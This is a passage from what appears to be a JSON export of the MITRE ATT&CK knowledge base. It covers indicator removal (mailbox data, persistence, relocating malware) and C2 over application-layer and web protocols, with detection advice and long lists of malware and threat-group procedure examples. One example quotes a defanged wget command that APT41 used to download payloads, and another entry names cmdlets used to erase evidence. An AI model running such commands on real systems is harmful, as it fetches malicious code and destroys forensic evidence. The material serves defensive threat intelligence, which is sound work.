      "Monitor executed commands and arguments that may delete or alter malicious network configuration settings as well as generated artifacts on a host system, including logs and files such asDefault.rdpor/var/log/.",
      "Monitor changes to files that may be indicators of deleting or altering malicious network configuration settings as well as generated artifacts on a host system that highlight network connection history, such asDefault.rdpor/var/log/.",
      "Monitor for changes made to firewall rules, especially unexpected modifications that may potentially be related to allowing and/or cleaning up previous tampering that enabled malicious network traffic.",
      "Monitor created processes with arguments that may delete or alter malicious network configuration settings as well as generated artifacts that highlight network connection history on a host system -- which may include logs, files, or Registry values.",
      "Monitor for changes to Registry keys (ex:HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default) and associated values that may be malicious attempts to conceal adversary network connection history."
    ],
    "Procedure Examples": [
      "SUNBURSTalso removed the firewall rules it created during execution.[6]",
      "Volt Typhoonhas inspected server logs to remove their IPs.[7]"
    ]
  },
  "T1070.008": {
    "Name": "Indicator Removal:Clear Mailbox Data",
    "Description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests.Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence ofPhishing/Internal Spearphishing,Email Collection,Mail Protocolsfor command and control, or email-based exfiltration such asExfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used theExchangePowerShellPowerShellmodule, includingRemove-MailboxExportRequestto remove evidence of mailbox exports.[1][2]On Linux and macOS, adversaries may also delete emails through a command line utility calledmailor useAppleScriptto interact with APIs on macOS.[3][4]Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.[5]",
    "Detects": [
      "In environments using Exchange, monitor logs for the creation or modification of mail processing settings, such as transport rules.",
      "Monitor executed commands and arguments that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined emails. In Exchange environments, monitor for PowerShell cmdlets that may create or alter transport rules, such asNew-TransportRuleandSet-TransportRule.[8]",
      "Monitor for deletion of generated artifacts on a host system, including logs or captured files such as quarantined emails.On Windows 10, mail application data is stored inC:\\Users\\Username\\AppData\\Local\\Comms\\Unistore\\data. On Linux, mail data is stored in/var/spool/mailor/var/mail. On macOS, mail data is stored in~/Library/Mail.",
      "Monitor for changes made to generated artifacts on a host system, including logs or captured files such as quarantined emails.On Windows 10, mail application data is stored inC:\\Users\\Username\\AppData\\Local\\Comms\\Unistore\\data. On Linux, mail data is stored in/var/spool/mailor/var/mail. On macOS, mail data is stored in~/Library/Mail.",
      "Monitor for newly executed processes with arguments that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined emails."
    ],
    "Procedure Examples": [
      "APT42has deleted login notification emails and has cleared the Sent folder to cover their tracks.[6]",
      "Goopyhas the ability to delete emails used for C2 once the content has been copied.[3]",
      "LunarMailcan set thePR_DELETE_AFTER_SUBMITflag to delete messages sent for data exfiltration.[7]",
      "During theSolarWinds Compromise,APT29removed evidence of email export requests usingRemove-MailboxExportRequest.[1]"
    ]
  },
  "T1070.009": {
    "Name": "Indicator Removal:Clear Persistence",
    "Description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables,Modify Registry,Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.[1]Adversaries may also delete accounts previously created to maintain persistence (i.e.Create Account).[2]In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may delete or alter generated artifacts associated with persistence on a host system.",
      "Monitor for a file that may delete or alter generated artifacts associated with persistence on a host system.",
      "Monitor for changes made to a file may delete or alter generated artifacts associated with persistence on a host system.",
      "Monitor for newly executed processes that may delete or alter generated artifacts associated with persistence on a host system.",
      "Monitor for changes made to scheduled jobs that may attempt to remove artifacts on a host system.",
      "Monitor for unexpected deletions of user accounts. Windows event logs may highlight activity associated with an adversary's attempt to remove an account (e.g.,Event ID 4726 - A user account was deleted).Alerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate account modification events with other indications of malicious activity where possible.",
      "Monitor windows registry keys that may be deleted or alter generated artifacts associated with persistence on a host system.",
      "Monitor for changes made to windows registry keys or values that may delete or alter generated artifacts associated with persistence on a host system."
    ],
    "Procedure Examples": [
      "Bazar's loader can delete scheduled tasks created by a previous instance of the malware.[3]",
      "GrimAgentcan delete previously created tasks on a compromised host.[4]",
      "IPsec Helpercan delete various service traces related to persistent execution when commanded.[5]",
      "Kapekawill clear registry values used for persistent configuration storage when uninstalled.[6]",
      "KOCTOPUScan delete created registry keys used for persistence as part of its cleanup procedure.[7]",
      "MCMDhas the ability to remove set Registry Keys, including those used for persistence.[8]",
      "Misdatis capable of deleting Registry keys used for persistence.[1]",
      "njRATis capable of manipulating and deleting registry keys, including those used for persistence.[9]",
      "Pillowmintcan uninstall the malicious service from an infected machine.[10]",
      "Raspberry Robinuses aRunOnceRegistry key for persistence, where the key is removed after its use on reboot then re-added by the malware after it resumes execution.[11]",
      "RTMhas the ability to remove Registry entries that it created for persistence.[12]",
      "S-Typehas deleted accounts it has created.[1]",
      "SUNBURSTremoved IFEO registry values to clean up traces of persistence.[13]"
    ]
  },
  "T1070.010": {
    "Name": "Indicator Removal:Relocate Malware",
    "Description": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined withFile Deletionto cleanup older artifacts.Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e.,Match Legitimate Resource Name or Location).[1]Payloads may also be repositioned to targetFile/Path Exclusionsas well as specific locations associated with establishingPersistence.[2]Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such asUser ExecutionandPhishing) that may have generated alerts or otherwise drawn attention from defenders.",
    "Detects": [
      "Monitor for changes to files that may highlight malware or otherwise potentially malicious payloads being copied between different file/folder locations on a host."
    ],
    "Procedure Examples": []
  },
  "T1071": {
    "Name": "Application Layer Protocol",
    "Description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.[1]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "Clamblinghas the ability to use Telnet for communication.[2]",
      "Duquuses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[3]",
      "DuringFrostyGoop Incident, the adversary initiated Layer Two Tunnelling Protocol (L2TP) connections to Moscow-based IP addresses.[4]",
      "Hildegardhas used an IRC channel for C2 communications.[5]",
      "INC Ransomhas used valid accounts over RDP to connect to targeted systems.[6]",
      "Lucifercan use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.[7]",
      "Magic Houndmalware has used IRC for C2.[8][9]",
      "Adversaries can also useNETEAGLEto establish an RDP connection with a controller over TCP/7519.",
      "Nightdooruses TCP and UDP communication for command and control traffic.[10][11]",
      "QUIETEXITcan use an inverse negotiated SSH connection as part of its C2.[1]",
      "Raspberry Robinis capable of contacting the TOR network for delivering second-stage payloads.[12][13][14]",
      "Rockeissued wget requests from infected systems to the C2.[15]",
      "Siloscapeconnects to an IRC server for C2.[16]",
      "Slivercan utilize the Wireguard VPN protocol for command and control.[17]",
      "TeamTNThas used an IRC bot for C2 communications.[18]",
      "Velvet Anthas used reverse SSH tunnels to communicate to victim devices.[19]"
    ]
  },
  "T1071.001": {
    "Name": "Application Layer Protocol:Web Protocols",
    "Description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such as HTTP/S[1]and WebSocket[2]that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor for web traffic to/from known-bad or suspicious domains and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm TeamusedBlackEnergyto communicate between compromised hosts and their command-and-control servers via HTTP post requests.[3]",
      "3PARA RATuses HTTP for command and control.[1]",
      "4H RATuses HTTP for command and control.[1]",
      "ABKhas the ability to use HTTP in communications with C2.[4]",
      "Action RATcan use HTTP to communicate with C2 servers.[5]",
      "ADVSTORESHELLconnects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.[6]",
      "Agent Teslahas used HTTP for C2 communications.[7][8]",
      "Amadeyhas used HTTP for C2 communications.[9]",
      "Anchorhas used HTTP and HTTPS in C2 communications.[10]",
      "ANDROMEDAhas the ability to make GET requests to download files from C2.[11]",
      "AppleJeushas sent data to its C2 server viaPOSTrequests.[12][13]",
      "AppleSeedhas the ability to communicate with C2 over HTTP.[14][15]",
      "APT18uses HTTP for C2 communications.[16]",
      "APT19used HTTP for C2 communications.APT19also used an HTTP malware variant to communicate over HTTP for C2.[17][18]",
      "Later implants used byAPT28, such asCHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.[19][20]",
      "APT32has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.[21][22]",
      "APT33has used HTTP for command and control.[23]",
      "APT37uses HTTPS to conceal C2 communications.[24]",
      "APT38used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.[25]",
      "APT39has used HTTP in communications with C2.[26][27]",
      "APT41used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.[28]",
      "APT41 DUSTused HTTPS for command and control.[29]",
      "APT42has used tools such asNICECURLwith command and control communication taking place over HTTPS.[30]",
      "ArcaneDoorcommand and control activity was conducted through HTTP.[31]",
      "Aria-bodyhas used HTTP in C2 communications.[32]",
      "AuTo Stealercan use HTTP to communicate with its C2 servers.[5]",
      "Avengerhas the ability to use HTTP in communication with C2.[4]",
      "BackConfighas the ability to use HTTPS for C2 communiations.[33]",
      "BACKSPACEuses HTTP as a transport to communicate with its command server.[34]",
      "BADHATCHcan use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers.[35][36]",
      "BADNEWSestablishes a backdoor over HTTP.[37]",
      "BadPatchuses HTTP for C2.[38]",
      "Bankshotuses HTTP for command and control communication.[39]",
      "Bazarcan use HTTP and HTTPS over ports 80 and 443 in C2 communications.[40][41][42]",
      "BBKhas the ability to use HTTP in communications with C2.[4]",
      "BBSRATuses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.[43]",
      "Bisonalhas used HTTP for C2 communications.[44][45]",
      "BITTERhas used HTTP POST requests for C2.[46][47]",
      "BlackBytecollected victim device information then transmitted this via HTTP POST to command and control infrastructure.[48]",
      "BlackEnergycommunicates with its C2 server over HTTP.[49]",
      "BlackMouldcan send commands to C2 in the body of HTTP POST requests.[50]",
      "BLINDINGCANhas used HTTPS over port 443 for command and control.[51]",
      "BLUELIGHTcan use HTTP/S for C2 using the Microsoft Graph API.[52]",
      "BOLDMOVEuses web services for command and control communication.[53]",
      "BoomBoxhas used HTTP POST requests for C2.[54]",
      "BRONZE BUTLERmalware has used HTTP for C2.[55]",
      "Brute Ratel C4can use HTTPS and HTTPS for C2 communication.[56][57]",
      "BUBBLEWRAPcan communicate using HTTP or HTTPS.[58]",
      "Bundloreuses HTTP requests for C2.[59]",
      "DuringC0017,APT41ranwget http://103.224.80[.]44:8080/kernelto download malicious payloads.[60]",
      "DuringC0018, the threat actors used HTTP for C2 communications.[61]",
      "DuringC0021, the threat actors used HTTP for some of their C2 communications.[62]",
      "TheCarbanakmalware communicates to its command server using HTTP with an encrypted payload.[63]",
      "Carberphas connected to C2 servers via HTTP.[64]",
      "Carboncan use HTTP in C2 communications.[65]",
      "Cardinal RATis downloaded using HTTP over port 443.[66]",
      "Chaeshas used HTTP for C2 communications.[67]",
      "CharmPowercan use HTTP to communicate with C2.[68]",
      "ChChescommunicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.[69][70]",
      "Chimerahas used HTTPS for C2 communications.[71]",
      "CHIMNEYSWEEPcan sendHTTP GETrequests to  C2.[72]",
      "China Chopper's server component executes code sent via HTTP POST commands.[73]",
      "Various implementations ofCHOPSTICKcommunicate with C2 over HTTP.[74]",
      "Clamblinghas the ability to communicate over HTTP.[75]",
      "One variant ofCloudDukeuses HTTP and HTTPS for C2.[76]",
      "COATHANGERuses an HTTP GET request to initialize a follow-on TLS tunnel for command and control.[77]",
      "Cobalt Grouphas used HTTPS for C2.[78][79][80]",
      "Cobalt Strikecan use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.[81][82][83][84][85]",
      "Comnieuses HTTP for C2 communication.[86]",
      "ComRAThas used HTTP requests for command and control.[87][88][89]",
      "Confuciushas used HTTP for C2 communications.[90]",
      "CORESHELLcan communicate over HTTP for C2.[19][91]",
      "CosmicDukecan use HTTP or HTTPS for command and control to hard-coded C2 servers.[76][92]",
      "Covenantcan establish command and control via HTTP.[93]",
      "CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.[94]",
      "CreepyDrivecan use HTTPS for C2 using the Microsoft Graph API.[95]",
      "CreepySnailcan use HTTP for C2.[95]",
      "Crimsoncan use a HTTP GET request to download its final payload.[96]",
      "Crutchhas conducted C2 communications with a Dropbox account using the HTTP API.[97]",
      "CSPY Downloadercan use GET requests to download additional payloads from C2.[98]",
      "Cuckoo Stealercan use the curl API for C2 communications.[99]",
      "Cyclops Blinkcan download files via HTTP and HTTPS.[100][101]",
      "Daclscan use HTTPS in C2 communications.[102][103]",
      "Daggerflyuses HTTP for command and control communication.[104]",
      "DanBotcan use HTTP in C2 communication.[105]",
      "Dark Caracal's version ofBandookcommunicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string \"&&&\".[106]",
      "DarkCometcan use HTTP for C2 communications.[107]",
      "DarkTortillahas used HTTP and HTTPS for C2.[108]",
      "DarkWatchmanuses HTTPS for command and control.[109]",
      "Daserfuses HTTP for C2.[55]",
      "DealersChoiceuses HTTP for communication with the C2 server.[110]",
      "DEATHRANSOMcan use HTTPS to download files.[111]",
      "Diavolhas used HTTP GET and POST requests for C2.[112]",
      "Dipsinduses HTTP for C2.[113]",
      "Dokihas communicated with C2 over HTTPS.[114]",
      "Donutcan use HTTP to download previously staged shellcode payloads.[115]",
      "down_newhas the ability to use HTTP in C2 communications.[4]",
      "DownPapercommunicates to its C2 server over HTTP.[116]",
      "DRATzaruscan use HTTP or HTTPS for C2 communications.[117]",
      "Dridexhas used POST requests and HTTPS for C2 communications.[118][119]",
      "Drovorubcan use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.[120]",
      "DustySkyhas used both HTTP and HTTPS for C2.[121]",
      "Dyreuses HTTPS for C2 communications.[122][123]",
      "Egregorhas communicated with its C2 servers via HTTPS protocol.[124]",
      "Elisecommunicates over HTTP or HTTPS for C2.[125]",
      "ELMERuses HTTP for command and control.[126]",
      "Emissaryuses HTTP or HTTPS for C2.[127]",
      "Emotethas used HTTP for command and control.[128]",
      "Empirecan conduct command and control over protocols like HTTP and HTTPS.[129]",
      "Epicuses HTTP and HTTPS for C2 communications.[130][131]",
      "EvilBunnyhas executed C2 commands directly via HTTP.[132]",
      "Exaramel for Linuxuses HTTPS for C2 communications.[133][134]",
      "Explosivehas used HTTP for communication.[135]",
      "FatDukecan be controlled via a custom C2 protocol over HTTP.[136]",
      "Felismususes HTTP for C2.[137]",
      "FELIXROOTuses HTTP and HTTPS to communicate with the C2 server.[138][139]",
      "FIN13has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.[140][141]",
      "FIN4has used HTTP POST requests to transmit data.[142][143]",
      "FIN8has used HTTPS for command and control.[144]",
      "Final1stspyuses HTTP for C2.[145]",
      "Flagprocan communicate with its C2 using HTTP.[146]",
      "FlawedAmmyyhas used HTTP for C2.[147]",
      "FoggyWebhas the ability to communicate with C2 servers over HTTP GET/POST requests.[148]",
      "FRAMESTINGcan retrieve C2 commands from values stored in theDSIDcookie from the current HTTP request or from decompressed zlib data within the request'sPOSTdata.[149]",
      "DuringFrankenstein, the threat actors used HTTP GET requests for C2.[150]",
      "FRPhas the ability to use HTTP and HTTPS to enable the forwarding of requests for internal services via domain name.[151]",
      "Gamaredon Grouphas used HTTP and HTTPS for C2 communications.[152][153][154][155][156][157][158]",
      "Gazercommunicates with its C2 servers over HTTP.[159]",
      "Gelsemiumcan use HTTP/S in C2 communications.[160]",
      "GeminiDukeuses HTTP and HTTPS for command and control.[76]",
      "Get2has the ability to use HTTP to send information collected from an infected host to C2.[161]",
      "Gold Dragonuses HTTP for communication to the control servers.[162]",
      "GoldenSpyhas used the Ryeol HTTP Client to facilitate HTTP internet communication.[163]",
      "GoldFinderhas used HTTP for C2.[164]",
      "GoldMaxhas used HTTPS and HTTP GET requests with custom HTTP cookies for C2.[164][165]",
      "Gomirperiodically communicates to its command and control infrastructure through HTTP POST requests.[166]",
      "Goopyhas the ability to communicate with its C2 over HTTP.[22]",
      "Grandoreirohas the ability to use HTTP in C2 communications.[167][168]",
      "GravityRATuses HTTP for C2.[169]",
      "GreyEnergyuses HTTP and HTTPS for C2 communications.[139]",
      "GrimAgenthas the ability to use HTTP for C2 communications.[170]",
      "GuLoadercan use HTTP to retrieve additional binaries.[171][172]",
      "HAFNIUMhas used open-source C2 frameworks, includingCovenant.[173]",
      "The \"Uploader\" variant ofHAMMERTOSSvisits a hard-coded server over HTTP/S to download the imagesHAMMERTOSSuses to receive commands.[174]",
      "HAWKBALLhas used HTTP to communicate with a single hard-coded C2 server.[175]",
      "Helminthcan use HTTP for C2.[176]",
      "Hi-Zorcommunicates with its C2 server over HTTPS.[177]",
      "Higaisaused HTTP and HTTPS to send data back to its C2 server.[178][179]",
      "Hikithas used HTTP for C2.[180]",
      "HTTPBrowserhas used HTTP and HTTPS for command and control.[181][182]",
      "httpclientuses HTTP for command and control.[1]",
      "HyperBrohas used HTTPS for C2 communications.[183]",
      "IceApplecan use HTTP GET to request and pull information from C2.[184]",
      "IcedIDhas used HTTPS in communications with C2.[185][186][187]",
      "Inceptionhas used HTTP, HTTPS, and WebDav in network communications.[188][189]",
      "DuringIndian Critical Infrastructure Intrusions,RedEchonetwork activity included SSL traffic over TCP 443 and HTTP traffic over non-standard ports.[190]",
      "Industroyer’s main backdoor connected to a remote C2 server using HTTPS.[191]",
      "InvisiMoleuses HTTP for C2 communications.[192]",
      "IPsec Helperconnects to command and control servers via HTTP POST requests based on parameters hard-coded into the malware.[193]",
      "Ixesheuses HTTP for command and control.[194][195]",
      "JHUHUGITvariants have communicated with C2 servers over HTTP and HTTPS.[196][197][198]",
      "DuringJuicy Mix,OilRigused a VBS script to send POST requests to register installed malware with C2.[199]",
      "Kapekautilizes HTTP for command and control.[200]",
      "Kazuaruses HTTP and HTTPS to communicate with the C2 server.Kazuarcan also act as a webserver and listen for inbound HTTP requests through an exposed API.[201]",
      "Ke3changmalware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.[202][203]",
      "Variants ofKevincan communicate with C2 over HTTP.[204]",
      "Keydnapuses HTTPS for command and control.[205]",
      "KEYPLUGhas the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2.[60]",
      "KGH_SPYcan send data to C2 with HTTP POST requests.[98]",
      "Kimsukyhas used HTTP GET and POST requests for C2.[206]",
      "Kinsinghas communicated with C2 over HTTP.[207]",
      "Koadichas used HTTP for C2 communications.[208]",
      "TheKomplexC2 channel uses HTTP POST requests.[209]",
      "KONNIhas used HTTP POST for C2.[210][211]",
      "KOPILUWAKhas used HTTP POST requests to send data to C2.[11]",
      "Latrodectuscan send registration information to C2 via HTTPPOST.[212][213][214]",
      "Lazarus Grouphas conducted C2 over HTTP and HTTPS.[215][102][103][216][217][218]",
      "LightSpy's C2 communication is performed over WebSockets using the open source library SocketRocket with functionality such as, heartbeat, receiving commands, and updating command status.[219]",
      "LIGHTWIREcan use HTTP for C2 communications.[149]",
      "Line Danceruses HTTP POST requests to interact with compromised devices.[31][220]",
      "Line Runnerutilizes an HTTP-based Lua backdoor on victim machines.[31][220]",
      "LiteDukecan use HTTP GET requests in C2 communications.[136]",
      "LitePowercan use HTTP and HTTPS for C2 communications.[221]",
      "LockBit 3.0can use HTTP to send victim host information to C2.[222][223]",
      "Lokibothas used HTTP for C2 communications.[224][225]",
      "LookBack’s C2 proxy tool sends data to a C2 server over HTTP.[226]",
      "LOWBALLcommand and control occurs via HTTPS over port 443.[58]",
      "LuminousMothhas used HTTP for C2.[227]",
      "Lumma Stealerhas used HTTP and HTTP for command and control communication.[228][229]",
      "LunarWebcan usePOSTto send victim identification to C2 andGETto retrieve commands.[230]",
      "Macheteuses HTTP for Command & Control.[231][232][233]",
      "MacSpyuses HTTP for command and control.[234]",
      "Mafaldacan use HTTP for C2.[235]",
      "Magic Houndhas used HTTP for C2.[236][237][238]",
      "MagicRATuses HTTP POST communication for command and control.[239]",
      "Mangocan retrieve C2 commands sent in HTTP responses.[199]",
      "Manjusakahas used HTTP for command and control communication.[240]",
      "MarkiRATcan initiate communication over HTTP/HTTPS for its C2 server.[241]",
      "Mazehas communicated to hard-coded IP addresses via HTTP.[242]",
      "MCMDcan use HTTPS in communication with C2 web servers.[243]",
      "MechaFlounderhas the ability to use HTTP in communication with C2.[244]",
      "Metadorhas used HTTP for C2.[235]",
      "metaMaincan use HTTP for C2 communications.[235][245]",
      "Metamorfohas used HTTP for C2.[246][247]",
      "Micropsiauses HTTP and HTTPS for C2 network communications.[248][249]",
      "Milancan use HTTPS for communication with C2.[250][204][251]",
      "MiniDukeuses HTTP and HTTPS for command and control.[76][136]",
      "Mis-Typenetwork traffic can communicate over HTTP.[252]",
      "Mongallcan use HTTP for C2 communication.[253]",
      "Moonstone Sleetused curl to connect to adversary-controlled infrastructure and retrieve additional payloads.[254]",
      "More_eggsuses HTTPS for C2.[78][255]",
      "Morican communicate using HTTP over IPv4 or IPv6 depending on a flag set.[256]",
      "MuddyWaterhas used HTTP for C2 communications.[257][258]",
      "Mustang Pandahas communicated with its C2 via HTTP POST requests.[259][260][261][262]",
      "Mythicsupports HTTP-based C2 profiles.[263]",
      "Neo-reGeorgcan use customized HTTP headers.[264]",
      "Neoichorcan use HTTP for C2 communications.[203]",
      "NETEAGLEwill attempt to detect if the infected host is configured to a proxy. If so,NETEAGLEwill send beacons via an HTTP POST request.NETEAGLEwill also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.[34]",
      "NETWIREhas the ability to communicate over HTTP.[265][266]",
      "NGLitewill initially beacon out to the NKN network via an HTTP POST over TCP 30003.[267]",
      "NICECURLhas used HTTPS for C2 communications.[30]",
      "DuringNight Dragon, threat actors used HTTP for C2.[268]",
      "Ninjacan use HTTP for C2 communications.[269]",
      "njRAThas used HTTP for C2 communications.[270]",
      "NOKKIhas used HTTP for C2 communications.[271]",
      "Octopushas used HTTP GET and POST requests for C2 communications.[272][273]",
      "OilBoostercan send HTTPGET,POST,PUT, andDELETErequests to the Microsoft Graph API over port 443 for C2 communication.[274]",
      "OilRighas used HTTP for C2.[275][276][277]",
      "Okrumuses HTTP for communication with its C2.[278]",
      "OLDBAITcan use HTTP for C2.[19]",
      "OnionDukeuses HTTP and HTTPS for C2.[76]",
      "OopsIEuses HTTP for C2 communications.[279][280]",
      "DuringOperation CuckooBees, the threat actors enabled HTTP and HTTPS listeners.[281]",
      "DuringOperation Dream Job,Lazarus Groupuses HTTP and HTTPS to contact actor-controlled C2 servers.[282]",
      "DuringOperation MidnightEclipse, threat actors usedwgetvia HTTP to retrieve payloads.[283][284]",
      "DuringOperation Wocao, threat actors’ XServer tool communicated using HTTP and HTTPS.[285]",
      "Orangewormhas used HTTP for C2.[286]",
      "OSX_OCEANLOTUS.Dcan also use use HTTP POST and GET requests to send and receive C2 information.[287]",
      "Out1can use HTTP and HTTPS in communications with remote hosts.[258]",
      "DuringOuter Space,OilRigused HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API.[199]",
      "OutSteelhas used HTTP for C2 communications.[288]",
      "OwaAuthuses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.[181]",
      "P.A.S. Webshellcan issue commands via HTTP POST.[134]",
      "Pandoracan communicate over HTTP.[289]",
      "PcSharehas used HTTP for C2 communication.[290]",
      "Peppycan use HTTP to communicate with C2.[96]",
      "PinchDuketransfers files from the compromised host via HTTP or HTTPS to a C2 server.[76]",
      "APingPullvariant can communicate with its C2 servers by using HTTPS.[291]",
      "PLEADhas used HTTP for communications with command and control (C2) servers.[292][293]",
      "PlugXcan be configured to use HTTP for command and control.[181][294]",
      "pngdowneruses HTTP for command and control.[1]",
      "PoetRAThas used HTTP and HTTPs for C2 communications.[295]",
      "PolyglotDukehas has used HTTP GET requests in C2 communications.[136]",
      "Ponyhas sent collected information to the C2 via HTTP POST request.[296]",
      "PoshC2can use protocols like HTTP/HTTPS for command and control traffic.[297]",
      "PowerShowerhas sent HTTP GET and POST requests to C2 servers to send information and receive instructions.[189]",
      "POWERTONhas used HTTP/HTTPS for C2 traffic.[298]",
      "PowGoopcan send HTTP GET requests to malicious servers.[299]",
      "POWRUNERcan use HTTP for C2 communications.[300][276]",
      "Proxysvcuses HTTP over SSL to communicate commands with the control server.[301]",
      "Psylouses HTTPS for C2.[302]",
      "Pteranodoncan use HTTP for C2.[152]",
      "PULSECHECKcan check HTTP request headers for a specific backdoor key and if found will output the result of the command in the variableHTTP_X_CMD.[303]",
      "PUNCHBUGGYenables remote interaction and can obtain additional code over HTTPS GET and POST requests.[304][305][306]",
      "Pupycan communicate over HTTP for C2.[307]",
      "QakBothas the ability to use HTTP and HTTPS in communication with C2 servers.[308][309][310]",
      "QUADAGENTuses HTTPS and HTTP for C2 communications.[311]",
      "Quick Assistcommunicates over TCP 443 via HTTPS to a remote session server, under which RDP traffic is transferred.[312]",
      "QUIETCANARYcan use HTTPS for C2 communications.[11]",
      "QuietSievecan use HTTPS in C2 communications.[313]",
      "Raccoon Stealeruses HTTP, and particularly HTTP POST requests, for command and control actions.[314][315][316]",
      "RainyDaycan use HTTP in C2 communications.[317]",
      "Ramsayhas used HTTP for C2.[318]",
      "Rancorhas used HTTP for C2.[319]",
      "Raspberry Robinuses outbound HTTP requests containing victim information for retrieving second stage payloads.[320]Variants ofRaspberry Robincan download archive files (such as 7-Zip files) via the victim web browser for second stage execution.[321]",
      "RATANKBAuses HTTP/HTTPS for command and control communication.[322][323]",
      "RCSessioncan use HTTP in C2 communications.[75][324]",
      "RDATcan use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API.[325]",
      "SomeReavervariants use HTTP for C2.[326]",
      "RedCurlhas used HTTP, HTTPS and Webdav protocls for C2 communications.[327][328]",
      "Mustang Pandaused HTTP POST messages for command and control fromPlugXinstallations duringRedDelta Modified PlugX Infection Chain Operations.[329]",
      "RedEchonetwork activity is associated with SSL traffic via TCP 443 and proxied HTTP traffic over non-standard ports.[190]",
      "RedLeavescan communicate to its C2 over HTTP and HTTPS if directed.[330][331]",
      "reGeorgcan use HTTP to tunnel connections in and out of targeted networks.[332]",
      "TheReginmalware platform supports many standard protocols, including HTTP and HTTPS.[333]",
      "RemexiusesBITSAdminto communicate with the C2 server over HTTP.[334]",
      "Remsecis capable of using HTTP and HTTPS for C2.[335][336][337]",
      "REvilhas used HTTP and HTTPS in communication with C2.[338][339][340][341][342]",
      "RGDooruses HTTP for C2 communications.[343]",
      "APT12has usedRIPTIDE, a RAT that uses HTTP to communicate.[344]",
      "Rising Sunhas used HTTP and HTTPS for command and control.[345]",
      "Rockehas executed wget and curl commands to Pastebin over the HTTPS protocol.[346]",
      "ROKRATcan use HTTP and HTTPS for command and control communication.[347][348][349]",
      "RTMhas initiated connections to external domains using HTTPS.[350]",
      "S-Typeuses HTTP for C2.[252]",
